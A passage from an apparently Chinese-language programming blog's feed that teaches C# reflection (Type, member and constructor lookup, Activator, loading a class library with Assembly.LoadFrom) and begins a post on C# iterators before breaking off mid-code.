&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<h3 id="5-语法相关"><a href="#5-语法相关" class="headerlink" title="5.语法相关"></a>5.语法相关</h3><p>Type（类的信息类）<br>它是反射功能的基础！<br>它是访问元数据的主要方式。<br>使用 Type 的成员获取有关类型声明的信息<br>有关类型的成员（如构造函数、方法、字段、属性和类的事件）</p>
<h4 id="5-1获取Type"><a href="#5-1获取Type" class="headerlink" title="5.1获取Type"></a>5.1获取Type</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.万物之父object中的 GetType()可以获取对象的Type</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">42</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">Type type = a.GetType();</span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(type);     --&gt;    System.Int32</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//2.通过typeof关键字 传入类名 也可以得到对象的Type</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Type type2 = <span class="keyword">typeof</span>(<span class="keyword">int</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(type2);    --&gt;    System.Int32</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//3.通过类的名字 也可以获取类型</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//  注意 类名必须包含命名空间 不然找不到</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Type type3 = Type.GetType(<span class="string">"System.Int32"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(type3);</span></pre></td></tr></table></figure>

<h3 id="5-2得到类的程序集信息"><a href="#5-2得到类的程序集信息" class="headerlink" title="5.2得到类的程序集信息"></a>5.2得到类的程序集信息</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//可以通过Type可以得到类型所在程序集信息            </span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(type.Assembly);</span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(type2.Assembly);</span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(type3.Assembly);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//三个输出都一样</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">System.Private.CoreLib, Version=<span class="number">4.0</span><span class="number">.0</span><span class="number">.0</span>, Culture=neutral, PublicKeyToken=<span class="number">7</span>cec85d7bea7798e</span></pre></td></tr></table></figure>

<h4 id="5-3获取类中的所有公共成员"><a href="#5-3获取类中的所有公共成员" class="headerlink" title="5.3获取类中的所有公共成员"></a>5.3获取类中的所有公共成员</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先得到Type</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Type t = <span class="keyword">typeof</span>(Test);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//然后得到所有公共成员</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//需要引用命名空间 using System.Reflection;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">MemberInfo[] infos = t.GetMembers();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; infos.Length; i++)</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(infos[i]);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//以下为输出</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function">Void <span class="title">Speak</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function">System.Type <span class="title">GetType</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function">System.String <span class="title">ToString</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function">Boolean <span class="title">Equals</span>(<span class="params">System.Object</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function">Int32 <span class="title">GetHashCode</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function">Void .<span class="title">ctor</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function">Void .<span class="title">ctor</span>(<span class="params">Int32</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function">Void .<span class="title">ctor</span>(<span class="params">Int32, System.String</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function">Int32 j</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function">System.String str</span></span></pre></td></tr></table></figure>

<h4 id="5-4获取类的公共构造函数并调用"><a href="#5-4获取类的公共构造函数并调用" class="headerlink" title="5.4获取类的公共构造函数并调用"></a>5.4获取类的公共构造函数并调用</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.获取所有构造函数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">ConstructorInfo[] ctors = t.GetConstructors();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ctors.Length; i++)</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Console.WriteLine(ctors[i]);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//以下为输出</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Void .ctor()</span></pre></td></tr><tr><td class="code"><pre><span class="line">Void .ctor(Int32)</span></pre></td></tr><tr><td class="code"><pre><span class="line">Void .ctor(Int32, System.String)</span></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//2.获取其中一个构造函数 并执行</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//得构造函数传入 Type数组 数组中内容按顺序是参数类型</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//执行构造函数传入  object数组 表示按顺序传入的参数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//  2-1得到无参构造</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">ConstructorInfo info = t.GetConstructor(<span class="keyword">new</span> Type[<span class="number">0</span>]);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//执行无参构造 无参构造 没有参数 传null</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Test obj = info.Invoke(<span class="literal">null</span>) <span class="keyword">as</span> Test;</span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(obj.j);   --&gt;  <span class="number">0</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//  2-2得到有参构造</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">ConstructorInfo info2 = t.GetConstructor(<span class="keyword">new</span> Type[] &#123; <span class="keyword">typeof</span>(<span class="keyword">int</span>) &#125;);</span></pre></td></tr><tr><td class="code"><pre><span class="line">obj = info2.Invoke(<span class="keyword">new</span> <span class="keyword">object</span>[] &#123; <span class="number">2</span> &#125;) <span class="keyword">as</span> Test;</span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(obj.str);  --&gt;  <span class="number">2</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">ConstructorInfo info3 = t.GetConstructor(<span class="keyword">new</span> Type[] &#123; <span class="keyword">typeof</span>(<span class="keyword">int</span>), <span class="keyword">typeof</span>(<span class="keyword">string</span>) &#125;);</span></pre></td></tr><tr><td class="code"><pre><span class="line">obj = info3.Invoke(<span class="keyword">new</span> <span class="keyword">object</span>[] &#123; <span class="number">4</span>, <span class="string">"444444"</span> &#125;) <span class="keyword">as</span> Test;</span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(obj.str);   --&gt;  <span class="number">444444</span></span></pre></td></tr></table></figure>

<h4 id="5-5获取类的公共成员变量"><a href="#5-5获取类的公共成员变量" class="headerlink" title="5.5获取类的公共成员变量"></a>5.5获取类的公共成员变量</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.得到所有成员变量</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">FieldInfo[] fieldInfos = t.GetFields();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fieldInfos.Length; i++)</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(fieldInfos[i]);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//2.得到指定名称的公共成员变量</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">FieldInfo infoJ = t.GetField(<span class="string">"j"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(infoJ);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//3.通过反射获取和设置对象的值</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Test test = <span class="keyword">new</span> Test();</span></pre></td></tr><tr><td class="code"><pre><span class="line">test.j = <span class="number">99</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">test.str = <span class="string">"2222"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//  3-1通过反射 获取对象的某个变量的值</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(infoJ.GetValue(test));</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//  3-2通过反射 设置指定对象的某个变量的值</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">infoJ.SetValue(test, <span class="number">100</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(infoJ.GetValue(test));</span></pre></td></tr></table></figure>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取类的公共成员方法</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//通过Type类中的 GetMethod方法 得到类中的方法</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//MethodInfo 是方法的反射信息</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Type strType = <span class="keyword">typeof</span>(<span class="keyword">string</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">MethodInfo[] methods = strType.GetMethods();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methods.Length; i++)</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(methods[i]);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//1.如果存在方法重载 用Type数组表示参数类型</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">MethodInfo subStr = strType.GetMethod(<span class="string">"Substring"</span>,</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Type[] &#123; <span class="keyword">typeof</span>(<span class="keyword">int</span>), <span class="keyword">typeof</span>(<span class="keyword">int</span>) &#125;);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//2.调用该方法</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//注意：如果是静态方法 Invoke中的第一个参数传null即可</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> str = <span class="string">"Hello,World!"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//第一个参数 相当于 是哪个对象要执行这个成员方法</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">object</span> result = subStr.Invoke(str, <span class="keyword">new</span> <span class="keyword">object</span>[] &#123; <span class="number">7</span>, <span class="number">5</span> &#125;);</span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(result);</span></pre></td></tr></table></figure>

<h4 id="5-6其他"><a href="#5-6其他" class="headerlink" title="5.6其他"></a>5.6其他</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Type;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//得枚举</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//GetEnumName</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//GetEnumNames</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//得事件</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//GetEvent</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//GetEvents</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//得接口</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//GetInterface</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//GetInterfaces</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//得属性</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//GetProperty</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//GetPropertys</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//等等</span></span></pre></td></tr></table></figure>
<h3 id="6-Activator"><a href="#6-Activator" class="headerlink" title="6.Activator"></a>6.Activator</h3><p>在之前首先利用反射获得构造函数再去获得对象显得过于麻烦<br>在c#这样的一个方法可以来快速实例化对象的类</p>
<p>用于将Type对象快捷实例化为对象<br>先得到Type<br>然后 快速实例化一个对象</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Type testType = <span class="keyword">typeof</span>(Test);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//1.无参构造</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Test testObj = Activator.CreateInstance(testType) <span class="keyword">as</span> Test;</span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(testObj.str);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//2.有参数构造</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">testObj = Activator.CreateInstance(testType, <span class="number">99</span>) <span class="keyword">as</span> Test;</span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(testObj.j);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">testObj = Activator.CreateInstance(testType, <span class="number">55</span>, <span class="string">"111222"</span>) <span class="keyword">as</span> Test;</span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(testObj.j);</span></pre></td></tr></table></figure>

<h2 id="7-程序集类"><a href="#7-程序集类" class="headerlink" title="7.程序集类"></a>7.程序集类</h2><p>主要用来加载其它程序集，加载后<br>才能用Type来使用其它程序集中的信息<br>如果想要使用不是自己程序集中的内容 需要先加载程序集<br>比如 dll文件(库文件)<br>简单的把库文件看成一种代码仓库，它提供给使用者一些可以直接拿来用的变量、函数或类</p>
<p>三种加载程序集的函数<br>一般用来加载在同一文件下的其它程序集<br>Assembly asembly2 = Assembly.Load(“程序集名称”);</p>
<p>一般用来加载不在同一文件下的其它程序集<br>Assembly asembly = Assembly.LoadFrom(“包含程序集清单的文件的名称或路径”);<br>Assembly asembly3 = Assembly.LoadFile(“要加载的文件的完全限定路径”);</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.先加载一个指定程序集</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Assembly assembly = Assembly.LoadFrom(<span class="string">@"H:\unity\c#进阶\Csharp进阶\Lesson18_练习题\bin\Debug\netcoreapp3.1\Lesson18_练习题"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">Type[] types = assembly.GetTypes();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//2.再加载程序集中的一个类对象 之后才能使用反射</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Type icon = asembly.GetType(<span class="string">"Lesson18_练习题.Icon"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">MemberInfo[] members = icon.GetMembers();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; members.Length; i++)</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Console.WriteLine(members[i]);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射 实例化一个 icon对象</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//首先得到枚举Type 来得到可以传入的参数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Type moveDir = asembly.GetType(<span class="string">"Lesson18_练习题.E_MoveDir"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">FieldInfo right = moveDir.GetField(<span class="string">"Right"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//直接实例化对象</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">object</span> iconObj = Activator.CreateInstance(icon, <span class="number">10</span>, <span class="number">5</span>, right.GetValue(<span class="literal">null</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//得到对象中的方法 通过反射</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">MethodInfo move = icon.GetMethod(<span class="string">"Move"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">MethodInfo draw = icon.GetMethod(<span class="string">"Draw"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">MethodInfo clear = icon.GetMethod(<span class="string">"Clear"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.Clear();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Thread.Sleep(<span class="number">1000</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    clear.Invoke(iconObj, <span class="literal">null</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    move.Invoke(iconObj, <span class="literal">null</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    draw.Invoke(iconObj, <span class="literal">null</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<h3 id="8-例题"><a href="#8-例题" class="headerlink" title="8.例题"></a>8.例题</h3><p>在外部生成一个类库，之后在另一个项目中使用反射来调用该类库</p>
<p>类库</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Linq;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Text;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Character</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">struct</span> Position</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">public</span> <span class="keyword">int</span> x;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">public</span> <span class="keyword">int</span> y;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Position</span>(<span class="params"><span class="keyword">int</span> x,<span class="keyword">int</span> y</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>        &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">this</span>.x = x;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">this</span>.y = y;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Player</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">public</span> <span class="keyword">string</span> name;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">public</span> <span class="keyword">int</span> hp;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">public</span> <span class="keyword">int</span> attack;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">public</span> <span class="keyword">int</span> defense;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">public</span> Position pos;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Player</span>(<span class="params"><span class="keyword">string</span> name,<span class="keyword">int</span> hp,<span class="keyword">int</span> attack,<span class="keyword">int</span> defense,Position pos</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>        &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">this</span>.name = name;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">this</span>.hp = hp;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">this</span>.attack = attack;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">this</span>.defense = defense;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">this</span>.pos = pos;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>新的项目</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Reflection;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">namespace Lesson_20练习题</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>        &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="comment">//首先加载该类库</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            Assembly assembly = Assembly.LoadFrom(<span class="string">@"H:\unity\c#进阶\Csharp进阶\Character\bin\Debug\Character"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="comment">//获取该类库到Type数组中</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            Type[] types = assembly.GetTypes();</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="comment">//循环遍历查看该类库中的所有类、结构体、枚举等等（namespace下面一级的名字）</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; types.Length; i++)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                Console.WriteLine(types[i]);</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="comment">//加载其中的一个类对象 再去使用反射，（这里加载的是结构体）</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            Type pos = assembly.GetType(<span class="string">"Character.Position"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="comment">//遍历该结构体中的所有方法</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            MemberInfo[] memberInfos = pos.GetMembers();</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; memberInfos.Length; i++)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                Console.WriteLine(memberInfos[i]);</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="comment">//快速实例化一个对象（调用其构造函数）,因为不知道其类型所以可以直接用object作为返回值类型来接收</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">object</span> posTest = Activator.CreateInstance(pos, <span class="number">5</span>, <span class="number">5</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">            Type player = assembly.GetType(<span class="string">"Character.Player"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">            MemberInfo[] memberInfos1 = player.GetMembers();</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; memberInfos1.Length; i++)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                Console.WriteLine(memberInfos1[i]);</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="comment">//循环遍历获取类中所有变量</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            FieldInfo[] fieldInfo = player.GetFields();</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fieldInfo.Length; i++)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                Console.WriteLine(fieldInfo[i]);</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">object</span> playerTest = Activator.CreateInstance(player, <span class="string">"hhk"</span>, <span class="number">100</span>, <span class="number">10</span>, <span class="number">10</span>, posTest);</span></pre></td></tr><tr><td class="code"><pre><span class="line">            Console.WriteLine(playerTest);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Csharp迭代器</title>
    <url>/2021/04/15/Csharp%E8%BF%AD%E4%BB%A3%E5%99%A8/</url>
    <content><![CDATA[<center>简单地了解了下C#中的迭代器</center>

<a id="more"></a>

<h3 id="1-迭代器是什么？"><a href="#1-迭代器是什么？" class="headerlink" title="1.迭代器是什么？"></a>1.迭代器是什么？</h3><p>迭代器（iterator）有时又称光标（cursor）<br>是程序设计的软件设计模式<br>迭代器模式提供一个方法顺序访问一个聚合对象中的各个元素<br>而又不暴露其内部的标识</p>
<p>在表现效果上看<br>是可以在容器对象（例如链表或数组）上遍历访问的接口<br>设计人员无需关心容器对象的内存分配的实现细节<br>可以用foreach遍历的类，都是实现了迭代器的</p>
<h3 id="2-标准迭代器的实现方法"><a href="#2-标准迭代器的实现方法" class="headerlink" title="2.标准迭代器的实现方法"></a>2.标准迭代器的实现方法</h3><p>关键接口：IEnumerator,IEnumerable<br>命名空间：using System.Collections;<br>可以通过同时继承IEnumerable和IEnumerator实现其中的方法</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">CustomList</span> : <span class="title">IEnumerable</span>, <span class="title">IEnumerator</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] list;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//从-1开始的光标 用于表示 数据得到了哪个位置</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> position = <span class="number">-1</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CustomList</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        list = <span 